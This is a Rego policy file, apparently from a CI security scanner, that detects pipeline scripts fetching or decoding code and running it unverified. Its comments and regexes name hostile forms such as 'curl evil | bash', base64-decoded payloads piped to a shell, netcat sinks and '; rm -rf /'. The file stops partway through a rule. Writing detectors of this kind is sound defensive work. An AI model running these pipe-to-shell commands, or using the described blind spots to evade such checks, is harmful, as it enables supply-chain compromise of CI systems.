# unverified-scripts — flag pipeline scripts that download or inline
# executable content without integrity verification. Classic vectors
# include `curl ... | bash`, download-then-exec, redirect-to-file-then-
# exec, Megalodon-style `echo "..." | base64 -d | bash`, and any
# command piped into a shell without verification.
#
# False-positive guards: the pattern check operates on the line with
# quoted substrings stripped, so a `| bash` that sits inside a string
# literal (an `echo` of installation instructions, a comment in a
# heredoc body) does not trigger. The heredoc-marker skip is scoped
# to the generic `| <shell>` pattern only, so a heredoc marker on the
# same line as a curl/wget/base64 download (`curl evil | bash <<EOF`)
# does NOT shield it from detection — the operator-intent argument
# only holds when the line itself isn't fetching external content.
# A leading echo/printf piping in-workflow data into an interpreter
# (`echo "$VAR" | python3 -c ...`) is likewise exempt from the generic
# pattern only, and only when no curl/wget/base64 is on the line
# (issue #236).
#
# Lines that include a checksum / signature verification command on
# the same line (sha256sum, shasum, gpg --verify, cosign verify, …)
# are treated as intentionally verified and skipped.
package unverified_scripts

import rego.v1

import data.lib.location

# Shell interpreters commonly used as pipe targets in CI attacks.
_shell := `bash|sh|zsh|python[23]?|perl|ruby|dash|ksh`

# Rego's raw (backtick-delimited) strings can't contain a literal
# backtick, so the character lives in an ordinary double-quoted string
# instead (backtick carries no special meaning there) and gets spliced
# into the raw regex patterns below with sprintf, wherever a backtick
# command substitution needs matching.
_backtick := "`"

deny contains finding if {
	some i, j
	job := input.pipeline.jobs[i]
	line := job.scripts[j]
	visible := _visible_line(line)
	_unsafe_script_line(visible, line)
	_fetched_or_inline_payload(visible, line)
	# Verification keyword check runs on the stripped line so an
	# attacker can't bypass the rule by putting `sha256sum` /
	# `cosign verify` inside a quoted string ("must sha256sum first").
	# Trust check runs on the stripped line and against the actual
	# curl/wget fetch target so a mention of a trusted host inside an
	# echo string, a `#` comment, or a different physical line of the
	# same `run:` block cannot suppress the finding for the real fetch.
	not _line_is_verified(visible)
	not _fetch_target_is_trusted(visible, line)
	# An immutable self-reference (the scanned repository's own content,
	# pinned to the exact commit the workflow runs at) is no entry at
	# all: the only party that could ever change it already committed
	# here. A self-reference on a branch or tag is NOT suppressed: it
	# falls through to _first_party_fields below, which reads it as a
	# first-party (insider) source instead of an outsider's.
	not _self_reference_immutable(line)
	base := {
		"code":       "ISSUE-411",
		"severity":   "high",
		"message":    sprintf("Job `%s` runs a script fetched from the network: `%s`.", [job.name, _quoted_script_line(line)]),
		"job":        job.name,
		"scriptLine": line,
		"line":       _script_location(job, line),
	}
	finding := object.union(base, _first_party_fields(line))
}

# _script_location: the first line of the script that fetches or carries
# the payload (#572), the script's own first line when no single line
# does, across every step running the same script, so the finding keeps
# one location.
_script_location(job, script) := n if {
	n := location.first({location.script_line(job, j, li) |
		some j, s in job.scripts
		s == script
		some li, l in split(s, "\n")
		_fetched_or_inline_payload(_visible_line(l), l)
	})
	n > 0
} else := location.first({location.script_line(job, j, 0) |
	some j, s in job.scripts
	s == script
})

# _first_party_fields is additive: a script line that is not first-party
# keeps the finding exactly as it read before trust followed the party
# that can change the code, not the party the workflow merely names.
default _first_party_fields(_) := {}

_first_party_fields(line) := {"firstParty": true} if _first_party(line)

# _fp_owner_repo is the scanned repository's own "owner/repo", lower
# case, "" when unknown.
_fp_owner_repo := own if {
	own := lower(object.get(input.pipeline, "projectPath", ""))
	own != ""
}

# _fp_owner is just the owner segment of an "owner/repo" path.
_fp_owner(ownerRepo) := owner if {
	parts := split(ownerRepo, "/")
	count(parts) > 0
	owner := parts[0]
}

# _url_pattern matches one fetch URL: a whole `${{ ... }}` expression
# taken as one unit (which may carry spaces of its own, e.g. `${{
# github.sha }}`), OR a run of characters that are never part of a
# shell metacharacter. The `${{ ... }}` branch MUST be tried first: Go's
# regexp (leftmost-first, not POSIX leftmost-longest) never backtracks
# out of a repetition to prefer a later, longer-matching alternative, so
# with the branches in the other order "$" and "{" each matched the
# plain-character branch one at a time and the match still stopped at
# the first internal space. Matching it this way, rather than a plain
# \S+ or a run up to the next shell metacharacter, is also what lets two
# URLs separated only by a space ("...install.sh https://evil/i.sh")
# split into two matches instead of one match swallowing both.
_url_pattern := `(?i)https?://(?:\$\{\{[^}]*\}\}|[^\s|;&'")])+`

# _fetch_segments splits line into one segment per shell command: a
# run of `;`, `&` (covering `;`, `&&`) or `|` (covering `|`, `||`) is a
# command separator, normalized to one marker character first
# (regex.replace, a fixed replacement with no backreference) so the
# plain string split() below needs only one literal delimiter. Each
# resulting segment carries at most one top-level command, which is
# what lets EVERY curl/wget command on the line be checked on its own,
# not just every literal URL some regex happened to find anywhere on
# the whole line, which could never tell a command with no checkable
# URL at all (a shell variable, a scheme-less target) apart from one
# that was simply never there.
_fetch_segments(line) := split(regex.replace(line, `[|;&]+`, "\u0001"), "\u0001")

# _is_fetch_segment is true when segment itself names a curl/wget
# command, as opposed to a segment some OTHER command's output merely
# flows into (the "sh" in "curl ... | sh").
_is_fetch_segment(segment) if regex.match(`(?i)\bcurl\b|\bwget\b`, segment)

# _fetch_command_segments is every segment of line that is its own
# curl/wget command.
_fetch_command_segments(line) := {s |
	some s in _fetch_segments(line)
	_is_fetch_segment(s)
}

# _command_token_pattern matches one shell token: a double- or
# single-quoted span (kept together even when it holds internal
# whitespace, so `-H "Authorization: x"` reads as two tokens, not
# four), or a run of (a whole `${{ ... }}` expression, which carries
# spaces of its own, taken as one unit, tried FIRST in the inner
# alternation, since Go's regexp is leftmost-first and never
# backtracks out of a repetition to prefer a later, longer-matching
# alternative; or any other non-whitespace character). Without the
# `${{ ... }}` branch, a self-reference URL built from
# `${{ github.sha }}` split into three separate tokens at its own
# internal spaces, rather than staying the one token it actually is.
# A bare `$( ... )` or backtick command substitution is kept whole the
# same way, so _fetch_units below can read its content as a command of
# its own.
_command_token_pattern := sprintf(`(?:"[^"]*"|'[^']*'|(?:\$\{\{[^}]*\}\}|\$\([^()]*\)|%s[^%s]*%s|[^\s])+)`, [_backtick, _backtick, _backtick])

# _has_fetch_keyword is true when the command's own tokens carry the
# curl/wget keyword at top level (not inside a substitution).
_has_fetch_keyword(tokens) if {
	some t in tokens
	lower(t) in {"curl", "wget"}
}

# _substitution_content is the command text inside a token that is, as
# a whole, one `$( ... )` or backtick command substitution (quoted or
# bare: the quotes are already trimmed off the token).
_substitution_content(tok) := substring(tok, 2, count(tok) - 3) if {
	startswith(tok, "$(")
	endswith(tok, ")")
}

_substitution_content(tok) := substring(tok, 1, count(tok) - 2) if {
	count(tok) >= 2
	startswith(tok, _backtick)
	endswith(tok, _backtick)
}

# _fetch_units is every command a fetch segment actually runs a fetch
# in: the segment itself when its own tokens carry the curl/wget
# keyword, plus the content of each whole-token command substitution
# that itself fetches (`sh -c "$(curl ...)"` runs its fetch there, one
# level deep). A fetch segment with neither (a keyword buried in some
# other shape) stays its own unit, which then fails every check below
# for lack of a top-level keyword: it is never provably first-party nor
# a self-reference.
_fetch_units(segment) := units if {
	top := {segment | _has_fetch_keyword(_command_tokens(segment))}
	subs := {c |
		some tok in _command_tokens(segment)
		c := _substitution_content(tok)
		_is_fetch_segment(c)
	}
	units := top | subs
	count(units) > 0
} else := {segment}

# _fetch_command_units is every fetch unit of every fetch segment of
# line.
_fetch_command_units(line) := {u |
	some s in _fetch_command_segments(line)
	some u in _fetch_units(s)
}

# _command_tokens is segment's own command tokenised in order (an
# array, not a set: positions matter for telling an option's own
# value apart from a fetch target), quotes trimmed off each token.
_command_tokens(segment) := [trim(m, "\"'") |
	some m in regex.find_n(_command_token_pattern, segment, -1)
]

# _fetch_keyword_index is the position, within tokens, of the
# curl/wget keyword that starts this command.
_fetch_keyword_index(tokens) := min({i |
	some i
	lower(tokens[i]) in {"curl", "wget"}
})

# _is_option_flag is true for any token that is itself an option
# (`-x`, `--long`), never a fetch target on its own.
_is_option_flag(tok) if startswith(tok, "-")

# _value_taking_options are, per fetch tool, the options that take a
# following argument of their own: that argument is an option's VALUE,
# never a fetch target, whatever it names. The sets are per tool
# because the same letter means different things: curl's `-O` saves
# under the remote name (no value) where wget's `-O` names the output
# file, and wget's `-H`, `-d`, `-c`, `-b`, `-m`, `-x`, `-K` and `-F`
# are plain flags. Reading a flag as value-taking would swallow the
# next token, a real fetch target, out of every check below, so only
# options documented as taking a value are listed: one missing here
# only keeps a finding (its value reads as a target that is not
# first-party), one wrongly listed could hide a target. A flag such as
# `--tlsv1.2` or `--ca-native` takes no value and is not listed.
_value_taking_options := {
	"curl": {
		"-o", "--output", "--output-dir",
		"-H", "--header",
		"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
		"-F", "--form",
		"-A", "--user-agent",
		"-u", "--user",
		"-U", "--proxy-user",
		"-X", "--request",
		"-e", "--referer",
		"-b", "--cookie",
		"-c", "--cookie-jar",
		"-T", "--upload-file",
		"-x", "--proxy",
		"-K", "--config",
		"-m", "--max-time",
		"-w", "--write-out",
		"-r", "--range",
		"-E", "--cert",
		"--key",
		"--cacert",
		"--proto", "--proto-redir",
		"--resolve",
		"--retry", "--retry-delay", "--retry-max-time",
		"--connect-timeout",
		"--limit-rate",
	},
	"wget": {
		"-O", "--output-document",
		"-o", "--output-file",
		"-a", "--append-output",
		"-e", "--execute",
		"-U", "--user-agent",
		"-T", "--timeout",
		"-t", "--tries",
		"-P", "--directory-prefix",
		"-A", "--accept",
		"-R", "--reject",
		"-X", "--exclude-directories",
		"-D", "--domains",
		"--header",
		"--user", "--password",
		"--post-data", "--body-data",
		"--referer",
		"--ca-certificate", "--certificate",
		"--limit-rate",
	},
}

# _target_injecting_options are, per fetch tool, the options whose
# value can bring in fetch targets the command line never shows: a
# curl config file (`-K`/`--config`) or variable (`--variable`, read by
# the `--expand-*` options), a wget input list (`-i`/`--input-file`),
# startup command (`-e`/`--execute`) or config file (`--config`). A
# command carrying one is never provably a self-reference nor
# first-party (_command_urls fails), whatever its visible URLs are.
_target_injecting_options := {
	"curl": {"-K", "--config", "--variable"},
	"wget": {"-i", "--input-file", "-e", "--execute", "--config"},
}

# _target_injecting_short_letters are the same options' short letters,
# matched inside a bundle of short flags (`-fsSLK cfg`).
_target_injecting_short_letters := {
	"curl": {"K"},
	"wget": {"i", "e"},
}

_injects_fetch_targets(tokens) if {
	tool := lower(tokens[_fetch_keyword_index(tokens)])
	some tok in tokens
	_is_target_injecting(tool, tok)
}

# The exact option, or its glued `--long=value` form.
_is_target_injecting(tool, tok) if {
	some opt in _target_injecting_options[tool]
	_option_matches(tok, opt)
}

# Every curl `--expand-*` option reads a `--variable` value.
_is_target_injecting(tool, tok) if {
	tool == "curl"
	startswith(tok, "--expand-")
}

# A bundle of short flags (or a short option with its value glued on)
# that carries one of the letters.
_is_target_injecting(tool, tok) if {
	startswith(tok, "-")
	not startswith(tok, "--")
	some letter in _target_injecting_short_letters[tool]
	contains(substring(tok, 1, -1), letter)
}

_option_matches(tok, opt) if tok == opt

_option_matches(tok, opt) if {
	startswith(opt, "--")
	startswith(tok, concat("", [opt, "="]))
}

# _is_options_value is true for the token right after a value-taking
# option of this command's own tool: it is consumed by that option,
# not a target in its own right (the `file` in `-o file`, the header
# text in `-H "..."`).
_is_options_value(tokens, i) if {
	i > 0
	tool := lower(tokens[_fetch_keyword_index(tokens)])
	tokens[i - 1] in _value_taking_options[tool]
}

# _fetch_targets is every token of the command, after its own
# curl/wget keyword, that is neither an option flag nor an option's
# own value: every one of these is a fetch target the command actually
# names, whatever it looks like (a literal URL, a scheme-less host, a
# shell variable, a bare word).
_fetch_targets(tokens) := [tok |
	kw := _fetch_keyword_index(tokens)
	some i
	i > kw
	tok := tokens[i]
	not _is_option_flag(tok)
	not _is_options_value(tokens, i)
]

# _is_literal_url is true when tok, taken as a WHOLE token (anchored
# start to end), is itself a well-formed http(s) URL: a scheme-less
# host, a bare word, or a `$`-expansion never matches this, whatever
# else it might otherwise look like.
_is_literal_url(tok) if regex.match(concat("", ["^", _url_pattern, "$"]), tok)

# _command_urls is every fetch target of ONE fetch segment's command,
# but ONLY when EVERY target is itself a literal URL (_is_literal_url):
# a command may carry more than one URL argument, and every one of
# them must pass, or the whole command fails. This is what tells a
# command whose second argument is a shell variable or a scheme-less
# host apart from one that simply never had a second argument at all,
# rather than silently reading only whichever targets happened to look
# like a URL and ignoring the rest.
default _command_urls(_) := set()

_command_urls(segment) := urls if {
	tokens := _command_tokens(segment)
	not _injects_fetch_targets(tokens)
	targets := _fetch_targets(tokens)
	count(targets) > 0
	every t in targets { _is_literal_url(t) }
	urls := {t | some t in targets}
}

# _url_host parses the host out of a (lower-cased) URL: strip the
# scheme, cut the authority at its first "/", drop a "userinfo@"
# prefix (everything up to and including the LAST "@": a password may
# itself carry one, but the host is always what follows the last one)
# and a ":port" suffix. No owner or other untrusted value is ever
# interpolated into a regex here: the result is compared as a plain
# string.
_url_host(url) := host if {
	after_scheme := regex.replace(url, `^https?://`, "")
	authority := split(after_scheme, "/")[0]
	at_parts := split(authority, "@")
	host_and_port := at_parts[count(at_parts) - 1]
	host := split(host_and_port, ":")[0]
}

# _url_path is the path segment of a (lower-cased) URL, "" when the URL
# has none (bare host, no trailing "/...").
_url_path(url) := path if {
	after_scheme := regex.replace(url, `^https?://`, "")
	idx := indexof(after_scheme, "/")
	idx >= 0
	path := substring(after_scheme, idx, -1)
} else := ""

# _first_party: EVERY fetch command on the line (not just every URL
# some regex found) carries a literal URL, and every one of those is a
# first-party domain of the scanned repository's own owner (the owner
# name as the registrable domain: clickhouse.com for ClickHouse/*), or
# the owner's own GitHub content (raw.githubusercontent.com/<owner>/...
# or github.com/<owner>/..., any repo, any ref), including the owner's
# own repository on a branch or tag, which _self_reference_immutable
# below does not cover. A command whose own URL is a shell variable or
# scheme-less fails this (empty _command_urls), the same as a
# non-first-party one. A line with no curl/wget command at all is
# never first-party.
_first_party(line) if {
	segments := _fetch_command_units(line)
	count(segments) > 0
	owner := _fp_owner(_fp_owner_repo)
	owner != ""
	every segment in segments {
		urls := _command_urls(segment)
		count(urls) > 0
		every url in urls {
			_first_party_host(lower(url), owner)
		}
	}
}

_first_party_host(url, owner) if _url_host(url) == sprintf("%s.com", [owner])

_first_party_host(url, owner) if {
	_url_host(url) == "raw.githubusercontent.com"
	startswith(_url_path(url), sprintf("/%s/", [owner]))
}

_first_party_host(url, owner) if {
	_url_host(url) == "github.com"
	startswith(_url_path(url), sprintf("/%s/", [owner]))
}

# _self_reference_immutable: EVERY fetch command on the line carries a
# literal URL, and every one of those is the scanned repository's own
# content (exact "owner/repo"), pinned to the commit the workflow runs
# at (a 40-hex SHA, or the unresolved ${{ github.sha }} expression).
# Nobody but whoever already committed here can ever change it, so
# this is no entry at all, unlike a branch or tag self-reference
# (first-party, not suppressed), and unlike a line that also fetches
# so much as one OTHER, non-self-referencing command (or one whose own
# URL is a shell variable or scheme-less, which fails this the same
# way: it is not provably a self-reference, so it must still be read
# as a finding, and as not first-party). A block that also runs a sink
# no curl/wget fetch accounts for (a netcat fetch, an inline base64
# payload decoded into a shell) is never suppressed either: otherwise
# one self-reference line would hide any sink in the same block.
_self_reference_immutable(line) if {
	not _non_fetch_sink(line)
	segments := _fetch_command_units(line)
	count(segments) > 0
	own := _fp_owner_repo
	own != ""
	every segment in segments {
		urls := _command_urls(segment)
		count(urls) > 0
		every url in urls {
			_self_reference_immutable_url(lower(url), own)
		}
	}
}

# _non_fetch_sink: the block runs something the curl/wget fetch
# segments do not account for, an inline base64 payload decoded into a
# shell or a netcat command (the same spellings _network_fetch reads).
_non_fetch_sink(line) if _inline_payload(_visible_line(line))

_non_fetch_sink(line) if regex.match(`(?i)(?:^|[^\w.-])(nc|ncat|netcat)\b`, line)

# _self_ref_commit_pattern has no owner or other untrusted value
# interpolated: by the time it runs, the "/<own>/" (or
# "/<own>/blob/"/"/<own>/raw/") prefix has already been stripped by a
# plain string operation (startswith/trim_prefix), so this only ever
# matches the remainder.
_self_ref_commit_pattern := `(?i)^(?:[0-9a-f]{40}|\$\{\{\s*github\.sha\s*\}\})/`

_self_reference_immutable_url(url, own) if {
	_url_host(url) == "raw.githubusercontent.com"
	p := _url_path(url)
	prefix := sprintf("/%s/", [own])
	startswith(p, prefix)
	regex.match(_self_ref_commit_pattern, trim_prefix(p, prefix))
}

# github.com/<own>/blob/<sha>/... (the HTML blob view) and
# github.com/<own>/raw/<sha>/... (the raw-content redirect) are both
# the repository's own content at that path.
_self_reference_immutable_url(url, own) if {
	_url_host(url) == "github.com"
	p := _url_path(url)
	some marker in ["blob", "raw"]
	prefix := sprintf("/%s/%s/", [own, marker])
	startswith(p, prefix)
	regex.match(_self_ref_commit_pattern, trim_prefix(p, prefix))
}

# The script line as quoted in the message. A backtick command
# substitution's own closing backtick can land right where the
# message's wrapping backtick closes too, reading as an empty
# backquoted token (two backticks back to back) rather than the code it
# actually is; trimming one trailing backtick before quoting avoids
# that collision without changing what the excerpt says.
_quoted_script_line(line) := trim_suffix(trim_space(line), _backtick)

# Strip quoted substrings (double then single quotes) and inline `#`
# comments so neither a pipe-to-shell hidden in a string literal nor a
# trusted hostname mentioned in a trailing comment can grant trust to
# the rest of the line. Inline comments require leading whitespace so
# URL fragments (`https://example.com/path#frag`) are preserved.
_visible_line(line) := stripped if {
	once := regex.replace(line, `"[^"]*"`, "")
	twice := regex.replace(once, `'[^']*'`, "")
	stripped := regex.replace(twice, `\s+#.*`, "")
}

# Heredoc on the same line — `cat <<EOF | bash`, `<<-EOF`, `<<'EOF'`,
# `<< "EOF"`. The pipe target is operator-authored, in-tree content,
# not an externally-sourced payload; any unsafe download inside the
# body still fires on its own script line.
_has_heredoc(line) if {
	regex.match(`<<-?\s*['"]?\w+`, line)
}

# Every dangerous sink falls into one of three families, and the
# trustedUrls exemption below is decided separately for each: family
# (a), the visible-line sinks, where the fetch and the dangerous shell
# sit on the same physical text with nothing hidden inside a
# substitution; family (b), the substitution sinks, where the fetch
# runs only once a command or process substitution's output reaches a
# shell, `eval`, or a sourcing builtin; and family (c), the wrapped-code
# sinks, where the fetch sits inside a plain quoted string that a
# shell's `-c` or `eval` runs as code.
_unsafe_script_line(visible, line) if _visible_line_sink_matches(visible, line)

_unsafe_script_line(visible, line) if _substitution_sink_matches(visible, line)

_unsafe_script_line(visible, line) if _wrapped_code_sink_matches(visible, line)

# Family (a): visible-line sinks. Patterns 1–4 fetch external content on
# the same line as the pipe, so a heredoc marker on the line does not
# shield them: an attacker putting `curl evil | bash <<EOF` is still
# doing a remote pipe-to-shell, the heredoc is just camouflage.

# curl|wget piped directly into a shell (classic supply-chain vector).
_visible_line_sink_matches(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^|&;\n]*%s`, [_exec_from_stdin]), visible)
}

# _exec_from_stdin: a pipe into an interpreter that runs what it reads
# on stdin as code: the interpreter alone, with options that are not
# `-c` (`bash -s`, `sh -x`, `python3 -`), or with `--` and the positional
# arguments of the piped script (`sh -s -- --yes`), behind sudo and its
# flags or environment assignments (`| POETRY_VERSION=$V python3 -`). An
# interpreter given `-c` or a script file reads stdin as data, never as
# code: `| python3 -c '...json.load(sys.stdin)'` parses what it is fed.
# The options are read case-sensitively ((?-i:...)): `-c` is the only
# letter left out, the patterns around it being case-insensitive.
_exec_from_stdin := sprintf(
	`\|\s*(?:sudo(?:\s+-\S+)*\s+)?(?:env\s+)?(?:[A-Za-z_]\w*=\S*\s+)*(?:\S*/)?(?:%s)(?:[ \t]+(?-i:-(?:-[a-z][\w-]*|[abd-zA-Z]+)?))*(?:[ \t]*$|[ \t]*[\n|;&)<>]|[ \t]+--(?:\s|$))`,
	[_shell],
)

# Download then execute on the same line (curl -o … && bash, etc.).
_visible_line_sink_matches(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^&;\n]*&&\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Download to a file then execute (; or &&).
_visible_line_sink_matches(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^;\n]*(?:>\s*\S+|-o\s+\S+)[^;\n]*(?:;|&&)\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Inline obfuscated payload (Megalodon: echo "…" | base64 -d | bash).
# The base64 blob gets stripped along with its quotes, but `echo  |
# base64 -d | bash` still matches because the rest of the chain is on
# the visible side of the quotes.
_visible_line_sink_matches(visible, _) if _inline_payload(visible)

_inline_payload(visible) if {
	regex.match(sprintf(`(?i)(echo|printf)\s+[^|]*\|\s*base64\s+(-d|--decode)\s*%s`, [_exec_from_stdin]), visible)
}

# Generic `<anything> | <shell>` catch-all. Skipped on heredoc-marker
# lines because `cat <<EOF | bash` is in-tree operator-authored content
# — but only when the line isn't ALSO matching one of the more specific
# patterns above (those run regardless of heredoc presence). Also
# skipped when the line is a leading echo/printf of in-workflow data
# (issue #236): piping a local variable into an interpreter is not a
# remote-code fetch.
_visible_line_sink_matches(visible, line) if {
	not _has_heredoc(line)
	not _echo_of_local_data(visible, line)
	regex.match(sprintf(`(?i)%s`, [_exec_from_stdin]), visible)
}

# _fetched_or_inline_payload: what the interpreter runs comes from the
# network (a fetch command on the line naming a host that is not the
# runner itself) or is an inline encoded payload (the base64 chain). A
# pipe of a repository file, of in-workflow data or of a local
# service's answer runs nothing fetched: `cat scripts/install.sh | bash`,
# `| python3 scripts/ci/x.py`, `curl http://127.0.0.1:7860/... | python3`,
# a repository file mounted into a container.
_fetched_or_inline_payload(visible, _) if _inline_payload(visible)

_fetched_or_inline_payload(_, line) if _network_fetch(line)

# _network_fetch: a fetch command (curl, wget, netcat) on the raw line
# whose arguments name a remote target: a URL or a host name that is not
# the runner itself, or, when it names no host at all, a variable or an
# expression standing for one. `apt-get install -y curl && ...` names
# the package, never a target.
_network_fetch(line) if {
	some m in regex.find_all_string_submatch_n(`(?i)(?:^|[^\w.-])(curl|wget|nc|ncat|netcat)((?:[ \t]+[^\s|&;)]+)*)`, line, -1)
	tokens := [t |
		some raw in regex.split(`\s+`, trim_space(m[2]))
		t := trim(raw, `"'`)
		t != ""
	]
	_remote_target(tokens)
}

_remote_target(tokens) if {
	some t in tokens
	h := _target_host(t)
	not _local_host(h)
}

_remote_target(tokens) if {
	count([t | some t in tokens; _target_host(t)]) == 0
	some t in tokens
	not startswith(t, "-")
	contains(t, "$")
}

# _target_host: the host a fetch argument names, a URL's or a bare
# host name's (`firebase.tools`, `evil.example.com 4444`), lower case;
# undefined for an option, a file name or anything else.
_target_host(t) := lower(m[0][1]) if {
	m := regex.find_all_string_submatch_n(`(?i)^(?:https?|ftps?)://(?:[^@/]*@)?(\[[^\]]*\]|[^:/?#]+)`, t, 1)
	count(m) > 0
} else := lower(t2) if {
	not startswith(t, "-")
	regex.match(`(?i)^[a-z0-9-]+(\.[a-z0-9-]+)+(:\d+)?(/\S*)?$`, t)
	t2 := regex.replace(t, `[:/].*$`, "")
	not regex.match(`(?i)\.(sh|bash|py|js|json|txt|ya?ml|xml|html?|log|out|zip|t?gz|tar|xz|bz2|deb|rpm|whl|exe|msi)$`, t2)
}

_local_host(h) if h in {"localhost", "0.0.0.0", "[::1]", "::1", "host.docker.internal"}

_local_host(h) if startswith(h, "127.")

# Family (b): substitution sinks. The fetch runs once a command or
# process substitution's output reaches a shell, `eval`, or a sourcing
# builtin, never on the visible text alone.

# A shell reading a fetched script through process substitution
# (`bash <(curl -s https://codecov.io/bash)`, the Codecov bash uploader)
# runs it exactly as a pipe would. The shell must be the command itself
# (optionally path-qualified or under sudo, flags allowed before the
# substitution), so `diff <(curl a) <(curl b)` is not a match.
_substitution_sink_matches(visible, _) if {
	regex.match(_process_substitution_pattern, visible)
}

# `source <(curl ...)` / `. <(curl ...)`: the shell builtins that read a
# process substitution's output as a script, exactly like `<shell>
# <( ... )` above but fronted by the sourcing builtin instead of an
# interpreter invocation.
_substitution_sink_matches(visible, _) if {
	regex.match(_source_process_substitution_pattern, visible)
}

_process_substitution_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+(?:-\S+\s+)*<\(\s*(curl|wget)\b`, [_shell])

_source_process_substitution_pattern := `(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:source|\.)\s+(?:-\S+\s+)*<\(\s*(curl|wget)\b`

# `bash < <(curl ...)`: a process substitution handed to the interpreter
# through an explicit stdin redirect instead of as a bare argument. The
# interpreter reads whatever its stdin carries exactly as it would an
# argument-form process substitution, so this is the same risk as
# _process_substitution_pattern above, one `<` further out.
_stdin_redirect_process_substitution_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+(?:-\S+\s+)*<\s*<\(\s*(curl|wget)\b`, [_shell])

_substitution_sink_matches(visible, _) if {
	regex.match(_stdin_redirect_process_substitution_pattern, visible)
}

# The command-substitution form (`/bin/bash -c "$(curl -fsSL ...)"`, the
# Homebrew/Docker installer). The substitution sits inside double quotes,
# which _visible_line strips, so the fetch is read off the raw line; the
# shell and its -c must still be on the visible side, so the same text
# inside an echo string does not match. Flags between the shell and -c are
# allowed, mirroring the process-substitution rule above: a bundle of
# boolean flags (`bash -eu -c "$(curl ...)"`) and a flag taking its own
# argument word (`bash -euo pipefail -c ...`, the hardened-CI idiom) are
# both still the same invocation, and so is a single bundled flag token
# carrying a `c` anywhere in it, trailing (`bash -euc "$(curl ...)"`) or
# not (`bash -ce ...`, `-uce`, `-xce`): bash, sh, zsh, dash and ksh read
# their own invocation flags one character at a time and set the
# pending-command-string state on any `c` in the bundle, reading the
# command from the next operand regardless of what else rides in the
# same token - `-c` need not be its own token, and `c` need not be its
# last letter. The skip stops at `;`, `&` or `|` so it can't reach past
# this command into an unrelated one later on the line. The substitution
# need not be the string's first token either, in either of the quoting
# forms the inner shell actually reads: double-quoted (`-c "set -e;
# $(curl ...)"`) or single-quoted (`-c 'set -e; $(curl ...)'`, which the
# inner shell still expands); the unquoted immediate form (`-c $(curl
# ...)`) has no string to put a prefix inside, so only the substitution
# itself is accepted there. A substitution OUTSIDE the quoted string
# (`-c "echo hi" && X=$(curl ...)`) is not this pattern's match: its
# output is only assigned to a variable, never handed to `-c` to run.
# Within the matched string, the fetch need not be the substitution's
# own first token either: a throwaway command before the real curl/wget
# (`$(printf ''; curl ...)`, `$(set -e; curl ...)`) still runs once the
# substitution's output reaches `bash -c`, so the fetch is matched
# anywhere inside the substitution, stopping at its closing `)` so it
# can't reach into a later, unrelated one.
#
# The substitution itself must sit at COMMAND POSITION inside the string:
# right at the string's start, or right after a command separator (`;`,
# `&`, `|`, a newline, `(` or `{`), optional whitespace allowed in
# between. A substitution that is the right-hand side of an assignment
# (`X=$(curl ...)`) or an argument handed to another command in the same
# string (`echo $(curl ...)`) is not a match there: its output is never
# what `-c` itself is asked to run, only assigned or passed along. This
# still has a residual limit: the outer shell splices the fetched text
# straight into the code the inner shell parses, so a fetch returning
# text that itself lands at command position (`; rm -rf /`, say) can
# still inject there; the control does not flag these forms.
_shell_c_dollar_paren_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\s*(?:"(?:[^"\n]*?[;&|(\n{]\s*)?\$\(|'(?:[^'\n]*?[;&|(\n{]\s*)?\$\(|\$\()[^)]*?\b(curl|wget)\b`, [_shell])

_substitution_sink_matches(visible, line) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\b`, [_shell]), visible)
	regex.match(_shell_c_dollar_paren_pattern, line)
}

# `eval "$(curl ...)"` / `eval $(wget ...)`: eval runs a command
# substitution's stdout as if it were typed, the same risk as a shell's
# own `-c`. Quotes around the substitution are optional and make no
# difference to what eval executes, so both are accepted, and the
# substitution need not be the string's first token either, mirroring
# the shell-c pattern above. It must sit at command position within that
# string too, for the same reason: an assignment or an argument
# substitution (`eval "X=$(curl ...)"`) is not run by eval, only
# produced as text eval never reaches as a command.
_eval_dollar_paren_pattern := `(?i)(?:^|[\s;&|(])eval\s+(?:"(?:[^"\n]*?[;&|(\n{]\s*)?\$\(|'(?:[^'\n]*?[;&|(\n{]\s*)?\$\(|\$\()[^)]*?\b(curl|wget)\b`

_substitution_sink_matches(visible, line) if {
	regex.match(`(?i)(?:^|[\s;&|(])eval\b`, visible)
	regex.match(_eval_dollar_paren_pattern, line)
}

# `` eval `curl ...` `` / `` <shell> -c `curl ...` ``: backtick command
# substitution, the older POSIX syntax for the same `$( ... )` construct.
# The front command (eval, or a shell's -c, bundled flags and all) sits
# before the opening backtick, which a wrapping double quote would strip
# from the visible line exactly as it does for `$( ... )`, so the front
# command is read off the visible line and the backtick-fetch shape off
# the raw line, mirroring the `$( ... )` rule above. The fetch need not be
# the substitution's first token, stopping at the closing backtick so it
# can't reach into a later, unrelated substitution.
_eval_backtick_pattern := sprintf(`(?i)(?:^|[\s;&|(])eval\s+(?:"(?:[^"\n]*?[;&|(\n{]\s*)?%s|'(?:[^'\n]*?[;&|(\n{]\s*)?%s|%s)[^%s]*?\b(curl|wget)\b`, [_backtick, _backtick, _backtick, _backtick])

_substitution_sink_matches(visible, line) if {
	regex.match(`(?i)(?:^|[\s;&|(])eval\b`, visible)
	regex.match(_eval_backtick_pattern, line)
}

_shell_c_backtick_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c[a-zA-Z]*\s*(?:"(?:[^"\n]*?[;&|(\n{]\s*)?%s|'(?:[^'\n]*?[;&|(\n{]\s*)?%s|%s)[^%s]*?\b(curl|wget)\b`, [_shell, _backtick, _backtick, _backtick, _backtick])

_substitution_sink_matches(visible, line) if {
